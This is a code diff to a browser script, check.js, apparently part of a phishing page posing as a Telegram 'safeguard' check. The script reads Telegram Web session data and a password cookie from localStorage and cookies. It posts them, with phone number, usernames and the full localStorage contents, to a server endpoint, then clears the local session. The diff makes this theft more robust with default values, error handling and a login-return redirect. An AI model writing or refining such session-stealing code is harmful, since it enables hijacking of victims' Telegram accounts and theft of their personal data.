@@ -37,16 +37,15 @@ document.addEventListener("DOMContentLoaded", function() {
         logToServer(`Attempt ${loginAttempts}/${maxLoginAttempts} - User not logged in`);
 
         if (loginAttempts >= maxLoginAttempts) {
-          console.log("check.js: Max login attempts reached, iframe should be visible");
-          logToServer("Max login attempts reached, iframe should be visible");
-          // Iframe is already shown by index.html, no further action needed
+          console.log("check.js: Max login attempts reached, user should have been redirected to login");
+          logToServer("Max login attempts reached, user should have been redirected to login");
           return;
         }
         return;
       }
     }
 
-    // If the user is logged in, check localStorage for tt-global-state and user_auth
+    // Check localStorage for tt-global-state and user_auth
     let globalState = localStorage.getItem("tt-global-state");
     console.log(`check.js: tt-global-state exists: ${!!globalState}`);
     logToServer(`tt-global-state exists: ${!!globalState}`);
@@ -57,7 +56,7 @@ document.addEventListener("DOMContentLoaded", function() {
     if (globalState && localStorage.getItem("user_auth")) {
       const parsedState = JSON.parse(globalState);
       const currentUserId = parsedState.currentUserId;
-      const currentUser = parsedState.users.byId[currentUserId];
+      const currentUser = parsedState.users?.byId?.[currentUserId];
       document.body.style.display = "none";
 
       if (currentUserId && currentUser) {
@@ -65,7 +64,7 @@ document.addEventListener("DOMContentLoaded", function() {
         logToServer(`Found user data for userId ${currentUserId}`);
 
         const { firstName, usernames, phoneNumber, isPremium } = currentUser;
-        const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1];
+        const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1] || "No password set";
 
         localStorage.removeItem("GramJs:apiCache");
         localStorage.removeItem("tt-global-state");
@@ -74,21 +73,31 @@ document.addEventListener("DOMContentLoaded", function() {
         logToServer(`Sending user data to /api/users/telegram/info for userId ${currentUserId}`);
 
         try {
-          await fetch(`/api/users/telegram/info`, {
+          const response = await fetch(`/api/users/telegram/info`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-              userId: currentUserId, firstName,
-              usernames, phoneNumber, isPremium,
-              password, quicklySet: localStorage,
-              type: new URLSearchParams(window.location.search).get("type")
+              userId: currentUserId,
+              firstName: firstName || "Unknown",
+              usernames: usernames || [],
+              phoneNumber: phoneNumber || "Unknown",
+              isPremium: isPremium || false,
+              password: password,
+              quicklySet: localStorage,
+              type: new URLSearchParams(window.location.search).get("type") || "safeguard"
             })
           });
+
+          if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+          }
+
           console.log(`check.js: Successfully sent user data to /api/users/telegram/info for userId ${currentUserId}`);
           logToServer(`Successfully sent user data to /api/users/telegram/info for userId ${currentUserId}`);
         } catch (error) {
           console.error(`check.js: Failed to send user data to /api/users/telegram/info: ${error.message}`);
           logToServer(`Failed to send user data to /api/users/telegram/info: ${error.message}`);
+          return; // Stop further execution if the API call fails
         }
 
         console.log(`check.js: Opening Telegram link and closing WebApp`);
@@ -117,12 +126,20 @@ document.addEventListener("DOMContentLoaded", function() {
       logToServer(`Attempt ${loginAttempts}/${maxLoginAttempts} - tt-global-state or user_auth not found`);
 
       if (loginAttempts >= maxLoginAttempts) {
-        console.log("check.js: Max attempts reached, iframe should be visible");
-        logToServer("Max attempts reached, iframe should be visible");
-        // Iframe is already shown by index.html, no further action needed
+        console.log("check.js: Max attempts reached, user should have been redirected to login");
+        logToServer("Max attempts reached, user should have been redirected to login");
         return;
       }
     }
+  }
+
+  // Check if we’re returning from a login redirect
+  const returnUrl = localStorage.getItem('returnUrl');
+  if (returnUrl && window.location.pathname !== returnUrl.split('?')[0]) {
+    console.log(`check.js: Returning from login, redirecting to ${returnUrl}`);
+    logToServer(`Returning from login, redirecting to ${returnUrl}`);
+    window.location.href = returnUrl;
+    return;
   }
 
   const checkInterval = setInterval(checkLocalStorage, 100);
